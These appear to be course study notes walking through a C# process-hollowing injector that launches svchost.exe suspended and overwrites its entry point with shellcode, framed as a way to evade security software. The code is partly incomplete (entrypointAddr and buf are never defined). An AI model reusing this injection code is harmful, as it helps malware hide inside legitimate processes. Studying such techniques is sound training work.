**Before compiling the project, set the CPU architecture to x64**

![[Pasted image 20240603233730.png]]

Check the current process ID -> "svchost.exe"

![](https://github.com/col-1002/OSEP-Course/blob/main/Attachment/Process_Hollowing_v1.png?raw=true)

### Breakdown

Importing Namespaces and Declaring DLL Imports + Namespace and Class Definition

#### Constant and Structure Definitions

```csharp
        public const uint CREATE_SUSPENDED = 0x4;
        // Constant to specify that the process should be created in a suspended state.

        public const int PROCESSBASICINFORMATION = 0;
        // Constant for identifying the type of information to query from the process.
```

#### Process Information Structures

[PROCESS_INFORMATION](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information) + [STARTUPINFOA](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa) 

```csharp
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct ProcessInfo
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 ProcessId;
            public Int32 ThreadId;
            // Structure to hold process and thread identifiers after process creation.
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartupInfo
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
            // Structure with various settings used to define window properties for processes that have a user interface.
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct ProcessBasicInfo
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
            // Structure to hold basic information about a process queried through the Windows API.
        }
```

#### Win32 API Functions Imports

```csharp
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        // Imports the Sleep function from kernel32.dll to pause the thread for a specified amount of time.

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref StartupInfo lpStartupInfo, out ProcessInfo lpProcessInformation);
        // Imports the CreateProcess function for creating a new process and its primary thread.

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);
        // Imports ZwQueryInformationProcess function from ntdll.dll to retrieve information about the process.

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfbytesRW);
        // Imports the ReadProcessMemory function to read memory in a specified process.

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        // Imports the WriteProcessMemory function to write memory to a specified process.

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);
        // Imports the ResumeThread function to resume a thread that was created in a suspended state.
```

#### Main Function

```csharp
        public static void Main(string[] args)
        {
            // The entry point of the program where the hollowing process starts.
```

#### Process Creation in Suspended State

```csharp
            // Start 'svchost.exe' in a suspended state
            StartupInfo sInfo = new StartupInfo();
            ProcessInfo pInfo = new ProcessInfo();
            bool cResult = CreateProcess(null, "c:\\windows\\system32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);
            // Initializes structures and calls CreateProcess to launch svchost.exe in suspended mode.
```

#### Query Process Basic Information

```csharp
            // Get Process Environment Block

 (PEB) memory address of suspended process (offset 0x10 from base image)
            ProcessBasicInfo pbInfo = new ProcessBasicInfo();
            uint retLen = new uint();
            long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
            IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x10);
            // Queries the basic process information to get the PEB address and then calculates the base image address.
```

#### Read Process Memory

```csharp
            // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
            byte[] procAddr = new byte[0x8];
            byte[] dataBuf = new byte[0x200];
            IntPtr bytesRW = new IntPtr();
            bool result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
            IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(procAddr, 0);
            result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);
            // Reads the executable's base address from PEB, then reads a chunk of data from the executable for parsing.
```

#### Manipulate and Inject Code

```csharp
            // Overwrite the memory at the identified address to 'hijack' the entrypoint of the executable
            result = WriteProcessMemory(pInfo.hProcess, entrypointAddr, buf, buf.Length, out bytesRW);
            // Writes the shellcode to the entry point of the executable in the target process.

            // Resume the thread to trigger our payload
            uint rResult = ResumeThread(pInfo.hThread);
            // Resumes the main thread of the target process, causing it to execute the injected shellcode.
        }
    }
}
// End of class and namespace.
```

This detailed breakdown covers each significant part of the code, explaining the purpose and functionality within the context of implementing process hollowing in C#.

# 5.5 Portable Executable (PE) Injection

TODO

# 5.6 Wrapping Up & TODO

In this module, several process injection and migration techniques were demonstrated. The exploration included a typical C# injection into a local process, as well as DLL injection into a remote process. Reflective DLL injection, which does not write to disk, was also covered, along with process hollowing to inject code into a process known to generate network activity. Each of these techniques helps reduce the footprint on the remote system and minimizes the chances of detection by security software.

**TODO**:
Portable Executable (PE) Injection
Modify the code to generate a Jscript file using DotNetToJscript that performs process hollowing.

.